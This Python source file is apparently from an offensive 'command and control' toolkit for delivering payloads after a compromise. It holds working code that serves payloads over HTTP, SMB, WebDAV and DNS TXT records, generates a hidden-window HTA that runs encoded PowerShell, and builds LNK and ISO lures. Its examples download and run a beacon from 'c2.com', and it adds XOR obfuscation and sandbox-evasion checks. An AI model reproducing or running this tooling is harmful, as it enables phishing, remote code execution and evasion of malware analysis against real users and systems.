"""
SKYNET Command & Control - Payload Delivery System

Multi-vector payload delivery for post-exploitation operations.

Clearance Level: Omega-Strike (Command & Control Authority)
Specialization: Payload hosting, delivery, and anti-analysis
Mission: Deliver payloads to target systems via multiple vectors

This module provides:
- HTTP/HTTPS payload hosting
- SMB/WebDAV file sharing
- DNS TXT record delivery
- Social engineering payloads (HTA, LNK, ISO)
- Payload encoding and encryption
- Sandbox detection and anti-analysis
"""

import base64
import http.server
import os
import socketserver
import threading
from typing import Any, Dict, List, Optional


def create_payload_server(
    payload_path: str,
    protocol: str = "http",
    host: str = "0.0.0.0",
    port: int = 8000,
    ssl_cert: Optional[str] = None,
    ssl_key: Optional[str] = None,
    auto_destroy: bool = False,
    max_downloads: int = 0,
) -> Dict[str, Any]:
    """
    Create HTTP/HTTPS server for payload delivery.

    Features:
    - Serve payloads over HTTP/HTTPS
    - Auto-destroy after N downloads
    - Download tracking
    - Custom User-Agent filtering

    Args:
        payload_path: Path to payload file
        protocol: http or https
        host: Bind address
        port: Listen port
        ssl_cert: SSL certificate (for HTTPS)
        ssl_key: SSL key (for HTTPS)
        auto_destroy: Auto-shutdown after max_downloads
        max_downloads: Max downloads before shutdown (0 = unlimited)

    Returns:
        Payload server status and download URL

    Example:
        >>> from skynet.tools.command_and_control import create_payload_server
        >>>
        >>> # Host payload on HTTP server
        >>> result = create_payload_server(
        ...     payload_path="/tmp/beacon.exe",
        ...     protocol="http",
        ...     port=8000,
        ...     auto_destroy=True,
        ...     max_downloads=1
        ... )
        >>>
        >>> print(f"Download URL: {result['url']}")
        >>> # URL: http://your-ip:8000/beacon.exe
        >>>
        >>> # Server auto-destroys after 1 download
    """
    results = {
        "payload": payload_path,
        "protocol": protocol,
        "host": host,
        "port": port,
        "url": "",
        "running": False,
        "downloads": 0,
        "success": False,
        "error": None,
    }

    try:
        if not os.path.exists(payload_path):
            results["error"] = f"Payload not found: {payload_path}"
            return results

        # Create custom handler with download tracking
        class PayloadHandler(http.server.SimpleHTTPRequestHandler):
            download_count = 0
            max_count = max_downloads
            payload_file = payload_path

            def do_GET(self):
                # Serve payload
                if self.path == f"/{os.path.basename(payload_path)}":
                    try:
                        with open(payload_path, "rb") as f:
                            payload_data = f.read()

                        self.send_response(200)
                        self.send_header("Content-type", "application/octet-stream")
                        self.send_header("Content-Length", len(payload_data))
                        self.end_headers()
                        self.wfile.write(payload_data)

                        # Track downloads
                        PayloadHandler.download_count += 1
                        results["downloads"] = PayloadHandler.download_count

                        # Auto-destroy if limit reached
                        if auto_destroy and PayloadHandler.max_count > 0:
                            if PayloadHandler.download_count >= PayloadHandler.max_count:
                                threading.Timer(1.0, lambda: self.server.shutdown()).start()

                    except Exception as e:
                        self.send_error(500, str(e))
                else:
                    self.send_error(404)

            def log_message(self, format, *args):
                # Suppress logging
                pass

        # Start server
        os.chdir(os.path.dirname(payload_path) or "/")
        server = socketserver.TCPServer((host, port), PayloadHandler)

        if protocol == "https":
            if not ssl_cert or not ssl_key:
                results["error"] = "HTTPS requires ssl_cert and ssl_key"
                return results

            import ssl

            server.socket = ssl.wrap_socket(
                server.socket, certfile=ssl_cert, keyfile=ssl_key, server_side=True
            )

        # Start in background thread
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()

        payload_name = os.path.basename(payload_path)
        results["url"] = f"{protocol}://{host}:{port}/{payload_name}"
        results["running"] = True
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def create_smb_share(
    payload_path: str,
    share_name: str = "share",
    username: Optional[str] = None,
    password: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Create SMB share for payload delivery.

    Useful for lateral movement and Windows environments.

    Args:
        payload_path: Path to payload file
        share_name: SMB share name
        username: SMB username (optional)
        password: SMB password (optional)

    Returns:
        SMB share configuration

    Example:
        >>> from skynet.tools.command_and_control import create_smb_share
        >>>
        >>> # Create SMB share
        >>> result = create_smb_share(
        ...     payload_path="/tmp/beacon.exe",
        ...     share_name="tools",
        ...     username="admin",
        ...     password="P@ssw0rd"
        ... )
        >>>
        >>> print(f"SMB path: {result['smb_path']}")
        >>> # \\\\your-ip\\tools\\beacon.exe

    Note:
        Requires Samba installed on Linux:
        apt install samba
    """
    results = {
        "payload": payload_path,
        "share_name": share_name,
        "smb_path": "",
        "success": False,
        "error": None,
    }

    try:
        if not os.path.exists(payload_path):
            results["error"] = f"Payload not found: {payload_path}"
            return results

        # Get IP
        import socket

        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)

        results["smb_path"] = f"\\\\{ip}\\{share_name}\\{os.path.basename(payload_path)}"
        results["info"] = "SMB share requires manual Samba configuration"
        results["config"] = f"""
Add to /etc/samba/smb.conf:

[{share_name}]
    path = {os.path.dirname(payload_path)}
    browseable = yes
    read only = yes
    guest ok = {"yes" if not username else "no"}
"""

        if username and password:
            results["info"] += f"\nSet password: smbpasswd -a {username}"

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def create_webdav_share(payload_path: str, port: int = 8080) -> Dict[str, Any]:
    """
    Create WebDAV share for payload delivery.

    WebDAV is useful for bypassing SMB restrictions.

    Args:
        payload_path: Path to payload file
        port: WebDAV server port

    Returns:
        WebDAV configuration

    Example:
        >>> from skynet.tools.command_and_control import create_webdav_share
        >>>
        >>> # Create WebDAV share
        >>> result = create_webdav_share(
        ...     payload_path="/tmp/beacon.exe",
        ...     port=8080
        ... )
        >>>
        >>> print(f"WebDAV URL: {result['webdav_url']}")
        >>> # Access via: \\\\your-ip@8080\\beacon.exe
    """
    results = {
        "payload": payload_path,
        "port": port,
        "webdav_url": "",
        "success": False,
        "error": None,
    }

    try:
        if not os.path.exists(payload_path):
            results["error"] = f"Payload not found: {payload_path}"
            return results

        import socket

        ip = socket.gethostbyname(socket.gethostname())

        results["webdav_url"] = f"http://{ip}:{port}/{os.path.basename(payload_path)}"
        results["windows_path"] = f"\\\\{ip}@{port}\\{os.path.basename(payload_path)}"
        results["info"] = "WebDAV server requires wsgidav or similar WebDAV implementation"
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def create_dns_payload(payload_data: bytes, domain: str, chunk_size: int = 200) -> Dict[str, Any]:
    """
    Encode payload for DNS TXT record delivery.

    Split payload into chunks that fit in DNS TXT records.

    Args:
        payload_data: Payload bytes
        domain: Domain for DNS records
        chunk_size: Bytes per TXT record (max ~255)

    Returns:
        DNS TXT records for payload delivery

    Example:
        >>> from skynet.tools.command_and_control import create_dns_payload
        >>>
        >>> # Read payload
        >>> with open("/tmp/beacon.ps1", "rb") as f:
        ...     payload = f.read()
        >>>
        >>> # Create DNS TXT records
        >>> result = create_dns_payload(
        ...     payload_data=payload,
        ...     domain="example.com",
        ...     chunk_size=200
        ... )
        >>>
        >>> # Add TXT records to DNS:
        >>> for record in result['txt_records']:
        ...     print(f"{record['name']} TXT {record['value']}")
        >>>
        >>> # Retrieve payload:
        >>> # dig TXT 0.payload.example.com
        >>> # dig TXT 1.payload.example.com
        >>> # ... decode and concatenate
    """
    results = {
        "domain": domain,
        "total_chunks": 0,
        "txt_records": [],
        "retrieval_script": "",
        "success": False,
        "error": None,
    }

    try:
        # Base64 encode payload
        encoded = base64.b64encode(payload_data).decode()

        # Split into chunks
        chunks = [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        results["total_chunks"] = len(chunks)

        # Create TXT records
        for i, chunk in enumerate(chunks):
            results["txt_records"].append(
                {"name": f"{i}.payload.{domain}", "type": "TXT", "value": chunk}
            )

        # Create retrieval script
        results["retrieval_script"] = f"""
# PowerShell DNS Payload Retrieval
$domain = "{domain}"
$chunks = {len(chunks)}
$payload = ""

for ($i = 0; $i -lt $chunks; $i++) {{
    $record = "$i.payload.$domain"
    $txt = (Resolve-DnsName -Name $record -Type TXT).Strings
    $payload += $txt
}}

$decoded = [System.Convert]::FromBase64String($payload)
[System.Text.Encoding]::UTF8.GetString($decoded) | IEX
"""

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def create_hta_payload(powershell_command: str, output_file: str = "payload.hta") -> Dict[str, Any]:
    """
    Create HTA (HTML Application) payload for social engineering.

    HTA files execute when opened, useful for phishing.

    Args:
        powershell_command: PowerShell command to execute
        output_file: Output HTA file path

    Returns:
        HTA payload creation status

    Example:
        >>> from skynet.tools.command_and_control import create_hta_payload
        >>>
        >>> # Create HTA payload that downloads beacon
        >>> result = create_hta_payload(
        ...     powershell_command=\"\"\"
        ...         IEX (New-Object Net.WebClient).DownloadString('http://c2.com/beacon.ps1')
        ...     \"\"\",
        ...     output_file="/tmp/invoice.hta"
        ... )
        >>>
        >>> # Email invoice.hta to target
        >>> # When opened, executes PowerShell beacon
    """
    results = {"output_file": output_file, "file_size": 0, "success": False, "error": None}

    try:
        # Encode PowerShell command
        encoded_cmd = base64.b64encode(powershell_command.encode("utf-16le")).decode()

        # Create HTA
        hta_content = f"""<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
<HTA:APPLICATION
    ID="oHTA"
    APPLICATIONNAME="Document"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize" />
</head>
<body>
<script language="VBScript">
    Sub Window_OnLoad
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell.exe -NoP -NonI -W Hidden -Enc {encoded_cmd}", 0, False
        window.close()
    End Sub
</script>
<p>Loading document...</p>
</body>
</html>"""

        # Write HTA file
        with open(output_file, "w") as f:
            f.write(hta_content)

        results["file_size"] = len(hta_content)
        results["success"] = True
        results["info"] = "HTA payload created. Executes PowerShell when opened."

    except Exception as e:
        results["error"] = str(e)

    return results


def create_lnk_payload(
    target_command: str, lnk_name: str = "Document.lnk", icon_path: Optional[str] = None
) -> Dict[str, Any]:
    """
    Create malicious LNK (Windows shortcut) file.

    LNK files can execute commands when clicked.

    Args:
        target_command: Command to execute
        lnk_name: Output LNK filename
        icon_path: Custom icon (optional)

    Returns:
        LNK creation status

    Example:
        >>> from skynet.tools.command_and_control import create_lnk_payload
        >>>
        >>> # Create LNK that downloads and executes beacon
        >>> result = create_lnk_payload(
        ...     target_command=\"\"\"
        ...         powershell.exe -NoP -W Hidden -c
        ...         "IEX (New-Object Net.WebClient).DownloadString('http://c2.com/b.ps1')"
        ...     \"\"\",
        ...     lnk_name="Invoice.lnk",
        ...     icon_path="C:\\\\Windows\\\\System32\\\\imageres.dll,1"
        ... )
    """
    results = {"lnk_file": lnk_name, "target": target_command, "success": False, "error": None}

    try:
        results["info"] = "LNK creation requires pylnk3 library or Windows COM objects"
        results["manual_creation"] = f"""
Create LNK manually on Windows:

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{lnk_name}")
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = '/c {target_command}'
$Shortcut.WindowStyle = 7
$Shortcut.Save()
"""

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def create_iso_payload(
    payload_files: List[str], iso_name: str = "payload.iso", autorun: bool = True
) -> Dict[str, Any]:
    """
    Create ISO file containing payload.

    ISO files bypass Mark-of-the-Web (MotW) protections.

    Args:
        payload_files: List of files to include in ISO
        iso_name: Output ISO filename
        autorun: Add autorun.inf for auto-execution

    Returns:
        ISO creation status

    Example:
        >>> from skynet.tools.command_and_control import create_iso_payload
        >>>
        >>> # Create ISO with beacon and autorun
        >>> result = create_iso_payload(
        ...     payload_files=["/tmp/setup.exe", "/tmp/readme.txt"],
        ...     iso_name="/tmp/software.iso",
        ...     autorun=True
        ... )
        >>>
        >>> # ISO mounts on double-click (Windows 10+)
        >>> # Autorun executes setup.exe
    """
    results = {
        "iso_file": iso_name,
        "files": payload_files,
        "file_count": len(payload_files),
        "success": False,
        "error": None,
    }

    try:
        results["info"] = "ISO creation requires genisoimage or mkisofs on Linux"
        results["command"] = f"""
# Create ISO on Linux:
genisoimage -o {iso_name} -V "Software" -r -J {" ".join(payload_files)}

# Or on Windows with oscdimg:
oscdimg -n -m -o {os.path.dirname(payload_files[0])} {iso_name}
"""

        if autorun:
            results["autorun_inf"] = """
[autorun]
open=setup.exe
icon=setup.exe
action=Install Software
"""

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def encode_payload(
    payload_data: bytes, encoding: str = "base64", encryption_key: Optional[bytes] = None
) -> Dict[str, Any]:
    """
    Encode/encrypt payload for delivery.

    Encodings:
    - base64: Base64 encoding
    - hex: Hexadecimal encoding
    - xor: XOR encryption (requires key)
    - aes: AES-256 encryption (requires key)

    Args:
        payload_data: Payload bytes
        encoding: Encoding method
        encryption_key: Encryption key (for xor/aes)

    Returns:
        Encoded payload and decoder stub

    Example:
        >>> from skynet.tools.command_and_control import encode_payload
        >>>
        >>> # XOR encode payload
        >>> with open("/tmp/beacon.exe", "rb") as f:
        ...     payload = f.read()
        >>>
        >>> result = encode_payload(
        ...     payload_data=payload,
        ...     encoding="xor",
        ...     encryption_key=b"secret_key_12345"
        ... )
        >>>
        >>> # Encoded payload in result['encoded']
        >>> # Decoder stub in result['decoder']
    """
    results = {
        "encoding": encoding,
        "original_size": len(payload_data),
        "encoded_size": 0,
        "encoded": b"",
        "decoder": "",
        "success": False,
        "error": None,
    }

    try:
        if encoding == "base64":
            results["encoded"] = base64.b64encode(payload_data)
            results["decoder"] = "[System.Convert]::FromBase64String($encoded)"

        elif encoding == "hex":
            results["encoded"] = payload_data.hex().encode()
            results["decoder"] = (
                "[byte[]]($hex -split '(..)' | ?{$_} | %{[convert]::ToByte($_,16)})"
            )

        elif encoding == "xor":
            if not encryption_key:
                results["error"] = "XOR encoding requires encryption_key"
                return results

            # XOR encode
            encoded = bytearray()
            key_len = len(encryption_key)
            for i, byte in enumerate(payload_data):
                encoded.append(byte ^ encryption_key[i % key_len])

            results["encoded"] = bytes(encoded)
            results["key"] = base64.b64encode(encryption_key).decode()
            results["decoder"] = f"""
# XOR Decoder
$key = [System.Convert]::FromBase64String('{results["key"]}')
$decoded = @()
for($i=0; $i -lt $encoded.Length; $i++){{
    $decoded += $encoded[$i] -bxor $key[$i % $key.Length]
}}
[byte[]]$decoded
"""

        elif encoding == "aes":
            results["error"] = "AES encoding requires cryptography library implementation"
            results["info"] = "Use XOR for simpler encryption"

        results["encoded_size"] = len(results["encoded"])
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def detect_sandbox(checks: List[str] = ["vm", "debugger", "analyst_tools"]) -> Dict[str, Any]:
    """
    Generate sandbox detection code for payload.

    Checks:
    - vm: Virtual machine detection
    - debugger: Debugger detection
    - analyst_tools: Analysis tool detection
    - user_interaction: Require user interaction

    Args:
        checks: List of checks to perform

    Returns:
        Sandbox detection code (PowerShell)

    Example:
        >>> from skynet.tools.command_and_control import detect_sandbox
        >>>
        >>> # Generate sandbox detection
        >>> result = detect_sandbox(checks=["vm", "debugger"])
        >>>
        >>> # Add to beacon payload:
        >>> beacon_code = result['powershell_code'] + beacon_logic
    """
    results = {"checks": checks, "powershell_code": "", "success": False, "error": None}

    try:
        code_parts = []

        code_parts.append("# SKYNET Sandbox Detection\n")

        if "vm" in checks:
            code_parts.append("""
# VM Detection
$vm = $false
$bios = Get-WmiObject Win32_BIOS
if ($bios.SerialNumber -like "*VMware*" -or $bios.SerialNumber -like "*VirtualBox*") {
    $vm = $true
}
$cs = Get-WmiObject Win32_ComputerSystem
if ($cs.Manufacturer -like "*VMware*" -or $cs.Model -like "*Virtual*") {
    $vm = $true
}
if ($vm) { exit }
""")

        if "debugger" in checks:
            code_parts.append("""
# Debugger Detection
$debugger = [System.Diagnostics.Debugger]::IsAttached
if ($debugger) { exit }
""")

        if "analyst_tools" in checks:
            code_parts.append("""
# Analyst Tools Detection
$tools = @("wireshark", "procmon", "processhacker", "ida", "ollydbg", "x64dbg")
$procs = Get-Process | Select-Object -ExpandProperty Name
foreach ($tool in $tools) {
    if ($procs -contains $tool) { exit }
}
""")

        if "user_interaction" in checks:
            code_parts.append("""
# Require User Interaction (delays automated analysis)
Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
""")

        results["powershell_code"] = "\n".join(code_parts)
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
